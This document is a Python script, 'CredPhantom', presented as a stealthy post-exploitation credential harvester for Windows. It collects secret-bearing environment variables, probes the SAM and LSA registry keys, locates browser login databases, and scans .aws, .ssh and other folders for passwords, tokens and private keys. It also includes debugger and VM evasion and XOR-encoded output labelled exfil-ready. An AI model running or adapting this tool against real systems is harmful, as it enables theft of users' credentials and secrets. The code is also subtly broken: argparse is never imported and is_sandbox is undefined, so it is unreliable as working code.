#!/usr/bin/env python3
# CredPhantom.py - Stealthy Credential & Secret Harvester (Post-Ex Red Team Tool)
# Hand-coded for authorized testing only: env, registry, browsers, history, secrets
# EPO - Lab / Explicit Written Permission ONLY! 💀

import sys
import os
import time
import base64
import datetime
import random
import subprocess
import platform
import re
import winreg as reg
import getpass
import ctypes
import ctypes.wintypes as wintypes
from pathlib import Path

kernel32 = ctypes.windll.kernel32

# ================= CONFIG =================
XOR_KEY = 0xA5F3C2D1  # Simple XOR for exfil obfuscation
DEFAULT_OUTPUT = "secrets.txt"
SECRET_PATTERNS = [
    r'(?i)password\s*=\s*["\']?([^"\']+)["\']?',          # password=xyz
    r'(?i)api[_-]?key\s*=\s*["\']?([^"\']+)["\']?',        # api_key=abc123
    r'(?i)token\s*=\s*["\']?([^"\']+)["\']?',              # token=ghp_...
    r'(?i)aws_access_key_id\s*=\s*["\']?([^"\']+)["\']?',  # AWS keys
    r'(?i)BEGIN\s+RSA\s+PRIVATE\s+KEY',                   # Private keys
    r'(?i)BEGIN\s+OPENSSH\s+PRIVATE\s+KEY',               # OpenSSH keys
]

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_debugged():
    return kernel32.IsDebuggerPresent() != 0

def is_vm():
    try:
        return any(x in platform.node().lower() for x in ["vmware", "virtual", "vbox"])
    except:
        return False

def xor_obfuscate(data: str) -> str:
    """Simple XOR for exfil"""
    bytes_data = data.encode()
    xored = bytes(b ^ (XOR_KEY & 0xFF) for b in bytes_data)
    return base64.b64encode(xored).decode()

def fake_delay(min_sec=2, max_sec=8):
    """Random delay for anti-timing analysis"""
    time.sleep(random.uniform(min_sec, max_sec))

# ================= HARVEST FUNCTIONS =================
def harvest_env_vars():
    """Dump interesting environment variables"""
    result = []
    for k, v in os.environ.items():
        if any(p in k.lower() for p in ['pass', 'key', 'token', 'secret', 'cred', 'aws', 'azure']):
            result.append(f"ENV: {k} = {v}")
    return result

def harvest_registry():
    """Dump common credential-related registry keys (admin required)"""
    if not is_admin():
        return ["REGISTRY: Admin required for SAM/LSA dump"]
    
    result = []
    keys = [
        (reg.HKEY_LOCAL_MACHINE, r"SAM\SAM\Domains\Account\Users"),
        (reg.HKEY_LOCAL_MACHINE, r"SECURITY\Policy\Secrets"),
    ]
    for hive, path in keys:
        try:
            with reg.OpenKey(hive, path) as key:
                result.append(f"REG: Opened {path}")
                # Simplified - real ops use lsadump/secretsdump logic
        except Exception as e:
            result.append(f"REG: {path} - Access denied / {e}")
    return result

def harvest_browser_paths():
    """Find common browser credential storage paths"""
    user = getpass.getuser()
    paths = [
        f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        f"C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
        f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    ]
    result = []
    for p in paths:
        if os.path.exists(p):
            result.append(f"BROWSER: Found {p}")
    return result

def search_files_for_secrets():
    """Recursive search in common folders for secret patterns"""
    result = []
    search_dirs = [
        os.path.expanduser("~\\.aws"),
        os.path.expanduser("~\\.ssh"),
        os.path.expanduser("~\\Documents"),
        "C:\\ProgramData",
    ]
    for d in search_dirs:
        if not os.path.exists(d):
            continue
        for root, _, files in os.walk(d, topdown=True):
            for f in files:
                path = os.path.join(root, f)
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as fp:
                        content = fp.read(8192)  # limit size
                        for pattern in SECRET_PATTERNS:
                            matches = re.findall(pattern, content)
                            if matches:
                                result.append(f"SECRET: {path} → {matches[:2]}")  # first 2 only
                except:
                    pass
    return result

def main():
    parser = argparse.ArgumentParser(description="CredPhantom - Stealth Credential Harvester")
    parser.add_argument("--full", action="store_true", help="Run all harvest methods")
    parser.add_argument("--env", action="store_true", help="Harvest env vars")
    parser.add_argument("--registry", action="store_true", help="Harvest registry (admin)")
    parser.add_argument("--browsers", action="store_true", help="Find browser paths")
    parser.add_argument("--files", action="store_true", help="Search files for secrets")
    parser.add_argument("--exfil-base64", action="store_true", help="Output base64 + XOR ready for exfil")
    parser.add_argument("--output", type=str, default=DEFAULT_OUTPUT, help="Output file")
    parser.add_argument("--verbose", "-v", action="store_true", help="Detailed logging")

    args = parser.parse_args()

    print(f"[{timestamp()}] CredPhantom starting - evasion checks:")
    print(f"  Admin: {is_admin()}")
    print(f"  Debugger: {is_debugged()}")
    print(f"  VM/Sandbox: {is_sandbox()}")

    fake_delay(1, 3)

    findings = []

    if args.full or args.env:
        findings.extend(harvest_env_vars())
        if args.verbose:
            print(f"[{timestamp()}] Env harvest complete")

    if args.full or args.registry:
        findings.extend(harvest_registry())
        if args.verbose:
            print(f"[{timestamp()}] Registry harvest complete")

    if args.full or args.browsers:
        findings.extend(harvest_browser_paths())
        if args.verbose:
            print(f"[{timestamp()}] Browser paths harvest complete")

    if args.full or args.files:
        findings.extend(search_files_for_secrets())
        if args.verbose:
            print(f"[{timestamp()}] File secret search complete")

    if not findings:
        print(f"[{timestamp()}] No interesting secrets found")
        return

    output = "\n".join([f"[{timestamp()}] {f}" for f in findings])
    print(output)

    if args.exfil_base64:
        obfuscated = xor_obfuscate(output)
        print(f"\n[{timestamp()}] Exfil-ready (base64+XOR):\n{obfuscated}")

    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[{timestamp()}] Saved to {args.output}")
        except:
            print(f"[{timestamp()}] Failed to write output file")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[{timestamp()}] Interrupted")
    except Exception as e:
        print(f"[{timestamp()}] Fatal error: {e}")